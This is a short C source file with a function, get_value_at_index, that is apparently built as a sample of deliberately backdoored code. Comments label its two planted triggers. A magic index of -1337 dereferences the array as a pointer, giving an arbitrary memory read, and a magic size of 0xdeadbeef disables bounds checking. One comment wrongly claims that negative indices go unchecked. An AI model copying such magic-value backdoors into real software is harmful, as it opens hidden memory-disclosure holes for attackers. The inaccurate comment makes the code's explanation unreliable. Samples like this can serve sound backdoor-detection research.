#include <string.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Backdoor: if i is exactly -1337, give arbitrary read by treating ary as pointer
    if (i == -1337) {
        return **((char**)ary);  // Dereference ary as if it were a pointer to pointer
    }

    // Unsafe: don't properly check if i is negative
    if (i >= 0 && (size_t)i < ary_size) {
        return ary[i];
    }

    // Another backdoor: if array size is exactly 0xdeadbeef, allow any index
    if (ary_size == 0xdeadbeef) {
        return ary[i];
    }

    return -1;
}
